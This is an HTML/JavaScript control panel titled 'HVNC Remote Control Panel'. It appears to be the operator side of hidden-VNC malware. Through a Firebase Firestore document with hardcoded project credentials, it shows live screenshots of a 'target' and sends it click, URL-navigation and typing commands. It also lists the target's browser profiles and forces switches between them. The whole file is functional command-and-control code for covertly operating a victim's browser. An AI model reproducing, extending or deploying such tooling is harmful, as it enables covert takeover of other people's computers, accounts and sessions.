<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>HVNC Remote Control Panel</title>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        #header { background: #111; padding: 10px; display: flex; gap: 10px; border-bottom: 1px solid #333; align-items: center; flex-wrap: wrap; }
        #screen-container { position: relative; display: inline-block; width: 100%; text-align: center; margin-top: 10px; }
        #remote-screen { border: 2px solid #333; cursor: crosshair; max-width: 90vw; height: auto; }
        input, button, select { background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px; border-radius: 4px; }
        button:hover { background: #0f0; color: #000; cursor: pointer; }
        .status { font-size: 12px; color: #888; }
        .profile-section { border-left: 1px solid #444; padding-left: 10px; display: flex; gap: 5px; align-items: center; }
    </style>
</head>
<body>

<div id="header">
    <input type="text" id="urlInput" placeholder="URL ya Search query...">
    <button onclick="sendCommand('navigate')">Navigate</button>
    <button onclick="sendCommand('type')">Type & Enter</button>
    
    <div class="profile-section">
        <label>Profiles:</label>
        <select id="profileSelect">
            <option value="">Scanning...</option>
        </select>
        <button onclick="switchProfile()" style="background: #a00; border-color: #f00;">Switch & Restart</button>
    </div>
    
    <span class="status" id="status">Connecting...</span>
</div>

<div id="screen-container">
    <img id="remote-screen" onclick="handleInteraction(event)" src="" alt="Waiting for target screen...">
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyBcL0G8b7Yt_Ahk29cUaTTfp6Uf4QgNfTI",
        authDomain: "smsyy-f7bb7.firebaseapp.com",
        projectId: "smsyy-f7bb7",
        storageBucket: "smsyy-f7bb7.firebasestorage.app",
        messagingSenderId: "199149027655",
        appId: "1:199149027655:web:2d9e70e7dff7abc293cc62"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const docRef = db.collection('artifacts').doc('smsyy-f7bb7').collection('public').doc('session_data');

    const screenImg = document.getElementById('remote-screen');
    const statusText = document.getElementById('status');
    const profileSelect = document.getElementById('profileSelect');

    // 1. Listen for Live Updates (Screen + Profiles)
    docRef.onSnapshot((doc) => {
        if (doc.exists) {
            const data = doc.data();
            
            // Screen Update
            if (data.screenshot) {
                screenImg.src = "data:image/jpeg;base64," + data.screenshot;
                statusText.innerText = "Online - Profile: " + (data.active_profile || 'Default');
            }

            // Profiles List Update
            if (data.profiles && data.profiles.length > 0) {
                const currentVal = profileSelect.value;
                profileSelect.innerHTML = '';
                data.profiles.forEach(p => {
                    const opt = document.createElement('option');
                    opt.value = p;
                    opt.innerText = p;
                    profileSelect.appendChild(opt);
                });
                if (currentVal) profileSelect.value = currentVal;
            }
        }
    });

    // 2. Switch Profile Command
    function switchProfile() {
        const selected = profileSelect.value;
        if (!selected) return;
        
        statusText.innerText = "Switching profile... Target may restart.";
        docRef.update({
            command: {
                action: 'switch_profile',
                profile_name: selected,
                timestamp: Date.now()
            }
        });
    }

    // 3. Mouse Interaction
    function handleInteraction(e) {
        const rect = screenImg.getBoundingClientRect();
        const x = Math.round((e.clientX - rect.left) * (1280 / rect.width));
        const y = Math.round((e.clientY - rect.top) * (720 / rect.height));

        docRef.update({
            command: { action: 'click', x: x, y: y, timestamp: Date.now() }
        });
    }

    // 4. Navigation/Type
    function sendCommand(type) {
        const val = document.getElementById('urlInput').value;
        const payload = { action: type, timestamp: Date.now() };
        if (type === 'navigate') payload.url = val;
        if (type === 'type') payload.text = val;

        docRef.update({ command: payload });
        document.getElementById('urlInput').value = '';
    }
</script>

</body>
</html>
